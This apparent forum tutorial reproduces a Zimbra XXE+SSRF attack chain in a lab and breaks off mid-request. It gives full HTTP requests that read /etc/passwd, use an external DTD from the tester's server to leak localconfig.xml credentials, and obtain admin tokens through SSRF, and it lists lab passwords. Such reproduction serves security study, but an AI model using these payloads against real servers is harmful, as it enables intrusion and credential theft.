---
title: Zimbra邮服渗透技巧
url: https://forum.butian.net/share/3658
source: 奇安信攻防社区
date: 2024-08-16
fetch_date: 2025-10-06T17:59:18.897096
---

# Zimbra邮服渗透技巧

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Zimbra邮服渗透技巧

* [渗透测试](https://forum.butian.net/topic/47)

zimbra作为常见的邮件服务器，了解其渗透与后渗透方式也必不可少。

### 搭建zimbra邮件服务器
在这里我们选择使用centos7搭建，具体流程参考下面三个链接即可。
<https://blog.csdn.net/u013618714/article/details/115478116>
[ttps://www.jianshu.com/p/722bc70ff426](https://www.jianshu.com/p/722bc70ff426)
<https://xz.aliyun.com/t/7991#toc-0>
基本信息：
服务器域名
=====
> vvvv1.zimbra.com
管理员账户
=====
> 账户密码：admin@vvvv1.zimbra.com\\123456
成功安装后，ping域名即可得到ip：
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685033991-50421459-2e4a-495f-bbbb-5c5e3dd9422f.png)
在外网访问目标网页，发现无法访问，原因是防火墙没有对外开放对应的端口。
> <https://192.168.52.142>
开启443端口或者关闭防火墙
> iptables -I INPUT -p tcp --dport 443 -j ACCEPT # 开启443端口
关闭防火墙
> systemctl stop firewalld
创建用户
> zmprov createAccount mary@zimbra.com admin123 displayName 'Mary'
>
> zmprov createAccount tom@zimbra.com admin123 displayName 'Tom'
或者在管理页面创建
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685340297-4460f71e-38ad-4bcd-add6-fbddd03f7eb0.png)
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685391069-17638d91-5719-4d0e-9171-6b2c40086345.png)
> root:6\\*fe~%xX4br)R8piK5Y
>
> vvvv1:R8+)uNIe\\_$Z~Jmx6hSE
>
> admin@vvvv1.zimbra.com:()5h8G@rv8qebcWCWjxH
>
> zjj@vvvv1.zimbra.com:1a1L+t#L#7Lrh7AO2xi
>
> xyq@vvvv1.zimbra.com:YJzmSl!o1Nwo%$Ld3npl
### 利用XXE+SSRF组合拳RCE复现
[https://blog.csdn.net/qq\\_44700119/article/details/129478006](https://blog.csdn.net/qq\_44700119/article/details/129478006)
<https://cn-sec.com/archives/1165703.html>
<http://www.xbhp.cn/news/152117.html>
#### 验证是否存在漏洞
POST请求/Autodiscover/Autodiscover.xml
```php
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 192.168.52.142
Cookie: ZA\_SKIN=serenity; ZA\_TEST=true; ZM\_TEST=true
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 350
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>
```
验证成功，返回/etc/passwd内容。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689685763262-0224fb1d-5ade-4eba-9614-300ba088851e.png)
#### 读取zimbra用户账号密码
XXE漏洞原理：
<http://www.xbhp.cn/news/152117.html>
利用xxe漏洞获取zimbra的关键配置文件内容，目的是从配置文件中获取zimbra的用户名及密码信息。对应的关键配置文件为localconfig.xml。
但是还有一个问题：这个目标文件是一个xml文件，因此不能直接在数据包中替换，(由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取)需要借用外部dtd,构造的外部dtd如下:
```php
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```
将该dtd命名为poc.dtd，并且在目标主机能访问到的主机开启http服务，保证在发送数据包的时候可以成功访问到目标文件，使其远程执行该dtd文件。
kali开启http
> python3 -m http.server 7777
发送如下数据包包含远程dtd文件。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689686621520-fd0a68d7-5976-44d8-acc1-edb51dd5b7e5.png)
```php
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: 192.168.52.142
Cookie: ZA\_SKIN=serenity; ZA\_TEST=true; ZM\_TEST=true
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 346
%dtd; %all; ]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request></Autodiscover>
```
获得密码：3JS3MkuYGG
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1689686747642-41d97bf9-de2e-4258-a880-5027438f5f52.png)
获取低权限的token
这里是向客户端登陆处/service/soap发送，也可以向管理员登陆处7071端口/service/admin/soap发送payload直接获取高权限token，注意下改端口以及将&lt;AuthRequest xmlns="urn:zimbraAccount"&gt;改为&lt;AuthRequest xmlns="urn:zimbraAdmin"&gt;即可。
```php
POST /service/soap HTTP/1.1
Host: 192.168.52.142
Content-Length: 469
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: \*/\*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Header>
<context xmlns="urn:zimbra">
<userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15\_GA\_2851.RHEL5\_64"/>
</context>
</soap:Header>
<soap:Body>
<AuthRequest xmlns="urn:zimbraAccount">
<account by="adminName">zimbra</account>
<password>3JS3MkuYGG</password>
</AuthRequest>
</soap:Body>
</soap:Envelope>
```
将获取到的低权限token设置到cookie中，探测是否存在ssrf，注意，修改cookie时如果401错误，将cookie字段ZM\\_AUTH\\_TOKEN改为ZM\\_ADMIN\\_AUTH\\_TOKEN即可
```php
POST /service/proxy?target=https://abcd.0lzme4.dnslog.cn HTTP/1.1
Host: 192.168.8.130:7071
Content-Length: 0
Cookie: ZM\_ADMIN\_AUTH\_TOKEN=0\_445fad824269f204515a7c310c0fc7fbfcfc425c\_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: \*/\*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
获取高权限的token
ssrf可利用后，结合低权限token获取一个高权限token，将&lt;AuthRequest xmlns="urn:zimbraAccount"&gt;改为&lt;AuthRequest xmlns="urn:zimbraAdmin"&gt;
```php
POST /service/proxy?target=https://192.168.52.142:7071/service/admin/soap HTTP/1.1
Host: 192.168.52.142:7071
Content-Length: 465
Cookie: ZM\_ADMIN\_AUTH\_TOKEN=0\_8461306ed16127d9f1138721e76f49db3b176a4c\_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313638393930353136373739383b747970653d363a7a696d6272613b7469643d31303a313430363031313230313b;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63
Content-Type: application/soap+xml; charset=UTF-8
Accept: \*/\*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
<soap:Header>
<context xmlns="urn:zimbra">
<userAgent name="ZimbraWebCl...